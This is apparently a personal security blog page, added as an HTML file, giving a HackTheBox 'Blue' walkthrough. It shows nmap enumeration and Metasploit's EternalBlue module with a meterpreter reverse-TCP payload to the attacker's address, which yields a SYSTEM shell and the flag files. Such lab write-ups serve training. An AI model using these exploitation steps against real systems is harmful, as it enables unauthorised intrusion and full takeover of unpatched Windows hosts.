@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>Lets Talk Security</title>
+        <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <meta content="Elliot Jamhuri Nkwama" name="keywords">
+        <meta content="Elliot Nkwama" name="keywords">
+        <meta content="elliot-hacks" name="keywords">
+        <meta content="Hackthebox" name="keywords">
+        <meta content="Blue" name="keywords">
+        <meta content="Write ups" name="keywords">
+        <meta content="Walk Through" name="keywords">
+        <meta content="Cyber Security blog" name="description">
+
+        <!-- Favicon -->
+        <link href="img/favicon.ico" rel="icon">
+
+        <!-- Google Web Fonts -->
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+        <!-- Icon Font Stylesheet -->
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
+
+        <!-- Libraries Stylesheet -->
+        <link href="/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+        <link href="/lib/lightbox/css/lightbox.min.css" rel="stylesheet">
+        <link href="/lib/animate/animate.min.css" rel="stylesheet">
+
+        <!-- Customized Bootstrap Stylesheet -->
+        <link href="/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Template Stylesheet -->
+        <link href="/css/style.css" rel="stylesheet">
+    </head>
+
+    <body style="margin: 0; font-family: Arial, sans-serif;">
+            <!-- Navigation Header -->
+            <header style="background-color: #333; color: white; padding: 15px 20px; position: sticky; top: 0; z-index: 1000; display: flex; justify-content: space-between; align-items: center;">
+                <a href="/" style="font-size: 24px; font-weight: bold; color: white; text-decoration: none;">@elliot-hacks</a>
+                <nav id="navMenu" style="display: flex; gap: 20px;">
+                    <a href="/" style="color: white; text-decoration: none; font-size: 16px;">Home</a>
+                    <a href="#about" style="color: white; text-decoration: none; font-size: 16px;">About</a>
+                    <a href="#blog" style="color: white; text-decoration: none; font-size: 16px;">Blog</a>
+                    <a href="#contact" style="color: white; text-decoration: none; font-size: 16px;">Contact</a>
+                </nav>
+                <div id="hamburgerMenu" style="font-size: 24px; cursor: pointer; display: none;">☰</div>
+            </header>
+        
+            <!-- Content Placeholder -->
+            <main style="padding: 20px; position: sticky; top: 0">
+                <h1>Welcome to My Blog</h1>
+                <p>Let's talk Security!</p>
+            </main>
+
+        <div class="container">
+            <div class="row g-5">
+                <div class="col-lg-4 sticky-lg-top vh-100">
+                    <div class="d-flex flex-column h-100 text-center overflow-auto shadow">
+                        <img class="w-100 img-fluid mb-4" src="/img/elliot-hacks.jpg" style="height: 400px;" alt="Image">
+                        <h1 class="text-primary mt-2">Elliot Jamhuri Nkwama</h1>
+                        <div class="mb-4" style="height: 22px;">
+                            <h4 class="typed-text-output d-inline-block text-light"></h4>
+                            <div class="typed-text d-none">Penetration Tester, Web Developer, Android Developer, System Archtecture</div>
+                        </div>
+                        <div class="d-flex justify-content-center mt-auto mb-3">
+                            <a class="btn btn-secondary btn-square mx-1" href="https://twitter.com/elliotH4cks"><i class="fab fa-twitter"></i></a>
+                            <a class="btn btn-secondary btn-square mx-1" href="https://facebook.com/thisguyhack"><i class="fab fa-facebook-f"></i></a>
+                            <a class="btn btn-secondary btn-square mx-1" href="https://linkedin.com/in/elliot-hacks"><i class="fab fa-linkedin-in"></i></a>
+                            <a class="btn btn-secondary btn-square mx-1" href="https://instagram.com/elliot.nkwama"><i class="fab fa-instagram"></i></a>
+                        </div>
+                        <div class="d-flex align-items-end justify-content-between border-top">
+                            <a href="" class="btn w-50 border-end">Download CV</a>
+                            <a href="#contact" class="btn w-50 btn-scroll">Contact Me</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-8">
+                    <!-- About Start -->
+                    <section class="py-5 border-bottom wow fadeInUp" data-wow-delay="0.1s">
+                        <h1 class="title pb-3 mb-5">Blue Hackthebox</h1>
+                        <div class="row mb-4">
+                            <article>
+                                <h3 id="the-provided-walkthrough-demonstrates-the-exploitation-of-a-vulnerable-windows-7-machine-blue-htb-using-the-ms17-010-eternalblue-exploit-via-metasploit-here-s-a-concise-breakdown-of-the-key-steps-and-insights-">The provided walkthrough demonstrates the exploitation of a vulnerable Windows 7 machine (<code>blue.htb</code>) using the MS17-010 (EternalBlue) exploit via Metasploit. Here’s a concise breakdown of the key steps and insights:</h3>
+                                <h3 id="steps-summary-">Steps Summary:</h3>
+                                <ol>
+                                <li><p><strong>Service Enumeration</strong>:</p>
+                                <ul>
+                                <li><strong>Basic Scan</strong>: <code>db_nmap blue.htb</code> identifies open SMB-related ports (135, 139, 445) and dynamic RPC ports.</li>
+                                <li><strong>Version Scan</strong>: <code>db_nmap -sVC -p135,139,445 blue.htb</code> provides detailed service and OS information, revealing it as Windows 7 Professional SP1.</li>
+                                </ul>
+                                </li>
+                                </ol>
+                                <hr>
+                                <pre>
+                                    <code>
+[msf](Jobs:0 Agents:0) >> db_nmap blue.htb  
+[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 19:36 EAT  
+[*] Nmap: Nmap scan report for blue.htb (10.10.10.40)  
+[*] Nmap: Host is up (0.52s latency).  
+[*] Nmap: Not shown: 991 closed tcp ports (reset)  
+[*] Nmap: PORT      STATE SERVICE  
+[*] Nmap: 135/tcp   open  msrpc  
+[*] Nmap: 139/tcp   open  netbios-ssn  
+[*] Nmap: 445/tcp   open  microsoft-ds  
+[*] Nmap: 49152/tcp open  unknown  
+[*] Nmap: 49153/tcp open  unknown  
+[*] Nmap: 49154/tcp open  unknown  
+[*] Nmap: 49155/tcp open  unknown  
+[*] Nmap: 49156/tcp open  unknown  
+[*] Nmap: 49157/tcp open  unknown  
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds  
+[msf](Jobs:0 Agents:0) >> db_nmap -sVC -p135,139,445 blue.htb  
+[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 19:37 EAT  
+[*] Nmap: Nmap scan report for blue.htb (10.10.10.40)  
+[*] Nmap: Host is up (0.41s latency).  
+[*] Nmap: PORT    STATE SERVICE      VERSION  
+[*] Nmap: 135/tcp open  msrpc        Microsoft Windows RPC  
+[*] Nmap: 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn  
+[*] Nmap: 445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
+[*] Nmap: Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows  
+[*] Nmap: Host script results:  
+[*] Nmap: | smb2-security-mode:  
+[*] Nmap: |   2:1:0:  
+[*] Nmap: |_    Message signing enabled but not required  
+[*] Nmap: | smb-os-discovery:  
+[*] Nmap: |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)  
+[*] Nmap: |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional  
+[*] Nmap: |   Computer name: haris-PC  
+[*] Nmap: |   NetBIOS computer name: HARIS-PC\x00  
+[*] Nmap: |   Workgroup: WORKGROUP\x00  
+[*] Nmap: |_  System time: 2024-10-07T17:37:21+01:00  
+[*] Nmap: | smb2-time:  
+[*] Nmap: |   date: 2024-10-07T16:37:19  
+[*] Nmap: |_  start_date: 2024-10-07T16:32:05  
+[*] Nmap: | smb-security-mode:  
+[*] Nmap: |   account_used: guest  
+[*] Nmap: |   authentication_level: user  
+[*] Nmap: |   challenge_response: supported  
+[*] Nmap: |_  message_signing: disabled (dangerous, but default)  
+[*] Nmap: |_clock-skew: mean: -19m57s, deviation: 34m34s, median: 0s  
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 27.32 seconds
+                                    </code>
+                                </pre>
+                                <ol>
+                                    <li><p><strong>Vulnerability Identification</strong>:</p>
+                                    <ul>
+                                    <li>The scan results indicate SMBv1 is enabled, and the target is likely vulnerable to MS17-010.</li>
+                                    <li><code>search eternalblue</code> in Metasploit reveals available modules for exploiting this vulnerability.</li>
+                                    </ul>
+                                    </li>
+                                </ol>
+                                <hr>
+                                <pre>
+                                    <code>
+[msf](Jobs:0 Agents:0) >> search eternalblue  
+  
+Matching Modules  
+================  
+  
+  #  Name                                      Disclosure Date  Rank     Check  Description  
+  -  ----                                      ---------------  ----     -----  -----------  
+  0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption  
+  1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution  
+  2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution  
+  3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection  
+  4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution  
+  
+  
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce  
+
+                                    </code>
+                                </pre>
+                                <ol>
+                                    <li><p><strong>Exploit Setup</strong>:</p>
+                                    <ul>
+                                    <li>The module <code>exploit/windows/smb/ms17_010_eternalblue</code> is selected.</li>
+                                    <li>Key options are configured:<ul>
+                                    <li><code>RHOSTS</code> set to the target IP (<code>blue.htb</code>).</li>
+                                    <li><code>LHOST</code> set to the attacker&#39;s IP (e.g., <code>10.10.14.5</code> via <code>tun0</code>).</li>
+                                    <li>Default payload: <code>windows/x64/meterpreter/reverse_tcp</code>.</li>
+                                    </ul>
+                                    </li>
+                                    <li><ul>
+                                    <li><ul>
+                                    <li>.</li>
+                                    </ul>
+                                    </li>
+                                    </ul>
+                                    </li>
+                                    </ul>
+                                    </li>
+                                    <li><p><strong>Exploitation</strong>:</p>
+                                    <ul>
+                                    <li>The exploit is executed, confirming the target is vulnerable and successfully exploiting the machine.</li>
+                                    <li>Meterpreter session is opened, granting full access with <code>NT AUTHORITY\SYSTEM</code>.</li>
+                                    </ul>
+                                    </li>
+                                    <li><p><strong>Post-Exploitation</strong>:</p>
+                                    <ul>
+                                    <li>Commands like <code>getuid</code>, <code>pwd</code>, and <code>dir</code> validate the session&#39;s permissions and explore the filesystem.</li>
+                                    <li>User directories, including sensitive ones like <code>Administrator</code> and <code>haris</code>, are navigated.</li>
+                                    </ul>
+                                    </li>
+                                </ol>
+                                <hr>
+                                <pre>
+                                    <code>
+
+[msf](Jobs:0 Agents:0) >> use 0  
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp  
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> options  
+  
+Module options (exploit/windows/smb/ms17_010_eternalblue):  
+  
+  Name           Current Setting  Required  Description  
+  ----           ---------------  --------  -----------  
+  RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html  
+  RPORT          445              yes       The target port (TCP)  
+  SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.  
+  SMBPass                         no        (Optional) The password for the specified username  
+  SMBUser                         no        (Optional) The username to authenticate as  
+  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.  
+  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.  
+  
+  
+Payload options (windows/x64/meterpreter/reverse_tcp):  
+  
+  Name      Current Setting  Required  Description  
+  ----      ---------------  --------  -----------  
+  EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)  
+  LHOST     192.168.17.181   yes       The listen address (an interface may be specified)  
+  LPORT     4444             yes       The listen port  
+  
+  
+Exploit target:  
+  
+  Id  Name  
+  --  ----  
+  0   Automatic Target  
+  
+  
+  
+View the full module info with the info, or info -d command.  
+  
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set RHOSTS blue.htb  
+RHOSTS => blue.htb  
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set LHOST tun0  
+LHOST => 10.10.14.5  
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run  
+  
+[*] Started reverse TCP handler on 10.10.14.5:4444    
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check  
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)  
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)  
+[+] 10.10.10.40:445 - The target is vulnerable.  
+[*] 10.10.10.40:445 - Connecting to target for exploitation.  
+[+] 10.10.10.40:445 - Connection established for exploitation.  
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply  
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)  
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes  
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv  
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1         
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply  
+[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.  
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet  
+[*] 10.10.10.40:445 - Starting non-paged pool grooming  
+[+] 10.10.10.40:445 - Sending SMBv2 buffers  
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.  
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.  
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!  
+[*] 10.10.10.40:445 - Receiving response from exploit packet  
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!  
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.  
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.  
+[*] Sending stage (200774 bytes) to 10.10.10.40  
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  
+[*] Meterpreter session 2 opened (10.10.14.5:4444 -> 10.10.10.40:49158) at 2024-10-07 19:44:38 +0300  
+  
+(Meterpreter 2)(C:\Windows\system32) > getuid  
+Server username: NT AUTHORITY\SYSTEM  
+(Meterpreter 2)(C:\Windows\system32) > pwd  
+C:\Windows\system32
+(Meterpreter 2)(C:\Windows\system32) > dir C:\  
+>    
+Listing: C:  
+===========  
+  
+Mode              Size   Type  Last modified              Name  
+----              ----   ----  -------------              ----  
+040777/rwxrwxrwx  0      dir   2017-07-21 09:56:27 +0300  $Recycle.Bin  
+040777/rwxrwxrwx  0      dir   2022-02-18 18:11:31 +0300  Config.Msi  
+040777/rwxrwxrwx  0      dir   2009-07-14 08:08:56 +0300  Documents and Settings  
+040777/rwxrwxrwx  0      dir   2009-07-14 06:20:08 +0300  PerfLogs  
+040555/r-xr-xr-x  4096   dir   2022-02-18 18:02:50 +0300  Program Files  
+040555/r-xr-xr-x  4096   dir   2017-07-14 19:58:41 +0300  Program Files (x86)  
+040777/rwxrwxrwx  4096   dir   2017-12-24 05:23:01 +0300  ProgramData  
+040777/rwxrwxrwx  0      dir   2022-02-18 17:09:14 +0300  Recovery  
+040777/rwxrwxrwx  0      dir   2017-07-14 16:48:44 +0300  Share  
+040777/rwxrwxrwx  4096   dir   2022-02-18 18:02:22 +0300  System Volume Information  
+040555/r-xr-xr-x  4096   dir   2017-07-21 09:56:23 +0300  Users  
+040777/rwxrwxrwx  16384  dir   2024-10-07 19:41:32 +0300  Windows  
+000000/---------  0      fif   1970-01-01 03:00:00 +0300  pagefile.sys  
+  
+(Meterpreter 2)(C:\Windows\system32) > cd C:\  
+>    
+(Meterpreter 2)(C:\Windows\system32) > dir Users  
+[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.  
+(Meterpreter 2)(C:\Windows\system32) > cd /  
+(Meterpreter 2)(C:\) > dir Users  
+Listing: Users  
+==============  
+  
+Mode              Size  Type  Last modified              Name  
+----              ----  ----  -------------              ----  
+040777/rwxrwxrwx  8192  dir   2017-07-21 09:56:36 +0300  Administrator  
+040777/rwxrwxrwx  0     dir   2009-07-14 08:08:56 +0300  All Users  
+040555/r-xr-xr-x  8192  dir   2009-07-14 10:07:31 +0300  Default  
+040777/rwxrwxrwx  0     dir   2009-07-14 08:08:56 +0300  Default User  
+040555/r-xr-xr-x  4096  dir   2011-04-12 10:51:29 +0300  Public  
+100666/rw-rw-rw-  174   fil   2009-07-14 07:54:24 +0300  desktop.ini  
+040777/rwxrwxrwx  8192  dir   2017-07-14 16:45:53 +0300  haris  
+  
+(Meterpreter 2)(C:\) > dir Users/Administrator  
+Listing: Users/Administrator  
+============================  
+  
+Mode              Size    Type  Last modified              Name  
+----              ----    ----  -------------              ----  
+040777/rwxrwxrwx  0       dir   2024-10-07 19:32:42 +0300  AppData  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  Application Data  
+040555/r-xr-xr-x  0       dir   2017-07-21 09:56:40 +0300  Contacts  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  Cookies  
+040555/r-xr-xr-x  0       dir   2017-12-24 05:22:48 +0300  Desktop  
+040555/r-xr-xr-x  4096    dir   2017-07-21 09:56:40 +0300  Documents  
+040555/r-xr-xr-x  4096    dir   2022-02-18 18:21:10 +0300  Downloads  
+040555/r-xr-xr-x  0       dir   2017-07-21 09:56:42 +0300  Favorites  
+040555/r-xr-xr-x  0       dir   2017-07-21 09:56:40 +0300  Links  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  Local Settings  
+040555/r-xr-xr-x  0       dir   2017-07-21 09:56:40 +0300  Music  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  My Documents  
+100666/rw-rw-rw-  786432  fil   2024-10-07 19:32:46 +0300  NTUSER.DAT  
+100666/rw-rw-rw-  65536   fil   2017-07-21 09:57:29 +0300  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf  
+100666/rw-rw-rw-  524288  fil   2017-07-21 09:57:29 +0300  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms  
+100666/rw-rw-rw-  524288  fil   2017-07-21 09:57:29 +0300  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  NetHood  
+040555/r-xr-xr-x  0       dir   2017-07-21 09:56:40 +0300  Pictures  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  PrintHood  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  Recent  
+040555/r-xr-xr-x  0       dir   2017-07-21 09:56:40 +0300  Saved Games  
+040555/r-xr-xr-x  0       dir   2017-07-21 09:56:40 +0300  Searches  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  SendTo  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  Start Menu  
+040777/rwxrwxrwx  0       dir   2017-07-21 09:56:24 +0300  Templates  
+040555/r-xr-xr-x  0       dir   2017-07-21 09:56:40 +0300  Videos  
+100666/rw-rw-rw-  262144  fil   2024-10-07 19:32:46 +0300  ntuser.dat.LOG1  
+100666/rw-rw-rw-  0       fil   2017-07-21 09:56:24 +0300  ntuser.dat.LOG2  
+100666/rw-rw-rw-  20      fil   2017-07-21 09:56:24 +0300  ntuser.ini  
+  
+(Meterpreter 2)(C:\) > dir Users/Administrator/Desktop  
+Listing: Users/Administrator/Desktop  
+====================================  
+  
+Mode              Size  Type  Last modified              Name  
+----              ----  ----  -------------              ----  
+100666/rw-rw-rw-  282   fil   2017-07-21 09:56:40 +0300  desktop.ini  
+100444/r--r--r--  34    fil   2024-10-07 19:32:42 +0300  root.txt  
+  
+(Meterpreter 2)(C:\) > type Users/Administrator/Desktop/root.txt  
+[-] Unknown command: type  
+(Meterpreter 2)(C:\) > cat Users/Administrator/Desktop/root.txt  
+                                        [ REDUCTED ]
+(Meterpreter 2)(C:\) > dir Users/haris  
+Listing: Users/haris  
+====================  
+  
+Mode              Size    Type  Last modified              Name  
+----              ----    ----  -------------              ----  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  AppData  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  Application Data  
+040555/r-xr-xr-x  0       dir   2017-07-15 10:58:33 +0300  Contacts  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  Cookies  
+040555/r-xr-xr-x  0       dir   2017-12-24 05:23:23 +0300  Desktop  
+040555/r-xr-xr-x  4096    dir   2017-07-15 10:58:33 +0300  Documents  
+040555/r-xr-xr-x  0       dir   2017-07-15 10:58:33 +0300  Downloads  
+040555/r-xr-xr-x  4096    dir   2017-07-15 10:58:33 +0300  Favorites  
+040555/r-xr-xr-x  0       dir   2017-07-15 10:58:33 +0300  Links  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  Local Settings  
+040555/r-xr-xr-x  0       dir   2017-07-15 10:58:33 +0300  Music  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  My Documents  
+100666/rw-rw-rw-  524288  fil   2021-01-15 12:41:00 +0300  NTUSER.DAT  
+100666/rw-rw-rw-  65536   fil   2017-07-14 17:03:15 +0300  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf  
+100666/rw-rw-rw-  524288  fil   2017-07-14 17:03:15 +0300  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms  
+100666/rw-rw-rw-  524288  fil   2017-07-14 17:03:15 +0300  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  NetHood  
+040555/r-xr-xr-x  0       dir   2017-07-15 10:58:32 +0300  Pictures  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  PrintHood  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  Recent  
+040555/r-xr-xr-x  0       dir   2017-07-15 10:58:33 +0300  Saved Games  
+040555/r-xr-xr-x  0       dir   2017-07-15 10:58:33 +0300  Searches  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  SendTo  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  Start Menu  
+040777/rwxrwxrwx  0       dir   2017-07-14 16:45:37 +0300  Templates  
+040555/r-xr-xr-x  0       dir   2017-07-15 10:58:32 +0300  Videos  
+100666/rw-rw-rw-  262144  fil   2022-02-18 18:02:40 +0300  ntuser.dat.LOG1  
+100666/rw-rw-rw-  0       fil   2017-07-14 16:45:36 +0300  ntuser.dat.LOG2  
+100666/rw-rw-rw-  20      fil   2017-07-14 16:45:37 +0300  ntuser.ini  
+  
+(Meterpreter 2)(C:\) > dir Users/haris/Desktop  
+Listing: Users/haris/Desktop  
+============================  
+  
+Mode              Size  Type  Last modified              Name  
+----              ----  ----  -------------              ----  
+100666/rw-rw-rw-  282   fil   2017-07-15 10:58:32 +0300  desktop.ini  
+100444/r--r--r--  34    fil   2024-10-07 19:32:42 +0300  user.txt  
+  
+(Meterpreter 2)(C:\) > cat Users/haris/Desktop/user.txt  
+                                        [ REDUCTED ]
+(Meterpreter 2)(C:\) >    
+
+                                    </code>
+                                </pre>
+                                <h1>There we pawned Blue ;) <img src="blue.png" alt="blue"></h1>    
+                            </article>
+                        </div>
+                    </section>
+                    <!-- About End -->
+
+                    <!-- Footer Start -->
+                    <section class="wow fadeIn" data-wow-delay="0.1s">
+                        <div class="bg-secondary text-light text-center p-5">
+                            <div class="d-flex justify-content-center mb-4">
+                                <a class="btn btn-dark btn-square mx-1" href="https://twitter.com/elliotH4cks"><i class="fab fa-twitter"></i></a>
+                                <a class="btn btn-dark btn-square mx-1" href="https://facebook.com/thisguyhack"><i class="fab fa-facebook-f"></i></a>
+                                <a class="btn btn-dark btn-square mx-1" href="https://linkedin.com/in/elliot-hacks"><i class="fab fa-linkedin-in"></i></a>
+                                <a class="btn btn-dark btn-square mx-1" href="https://instagram.com/elliot.nkwama"><i class="fab fa-instagram"></i></a>
+                            </div>
+                            <div class="d-flex justify-content-center mb-3">
+                                <a class="text-light px-3 border-end" href="#">Privacy</a>
+                                <a class="text-light px-3 border-end" href="#">Terms</a>
+                                <a class="text-light px-3 border-end" href="#">FAQs</a>
+                                <a class="text-light px-3" href="#">Help</a>
+                            </div>
+							
+                            <!--/*** This template is free as long as you keep the footer author’s credit link/attribution link/backlink. If you'd like to use the template without the footer author’s credit link/attribution link/backlink, you can purchase the Credit Removal License from "https://htmlcodex.com/credit-removal". Thank you for your support. ***/-->
+							<p class="m-0">&copy; All Rights Reserved. <a href="mailto:thisguyhack@gmail.com">elliot-hacks</a></p>
+                        </div>
+                    </section>
+                    <!-- Footer End -->
+                </div>
+            </div>
+        </div>
+
+        
+        <!-- Back to Top -->
+        <a href="#" class="back-to-top"><i class="fa fa-angle-double-up"></i></a>
+        
+        <!-- JavaScript Libraries -->
+        <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
+        <script src="/lib/wow/wow.min.js"></script>
+        <script src="/lib/typed/typed.min.js"></script>
+        <script src="/lib/easing/easing.min.js"></script>
+        <script src="/lib/waypoints/waypoints.min.js"></script>
+        <script src="/lib/counterup/counterup.min.js"></script>
+        <script src="/lib/owlcarousel/owl.carousel.min.js"></script>
+        <script src="/lib/isotope/isotope.pkgd.min.js"></script>
+        <script src="/lib/lightbox/js/lightbox.min.js"></script>
+
+        <!-- Contact Javascript File -->
+        <script src="/mail/jqBootstrapValidation.min.js"></script>
+        <script src="/mail/contact.js"></script>
+
+        <!-- Template Javascript -->
+        <script src="/js/main.js"></script>
+    </body>
+</html>
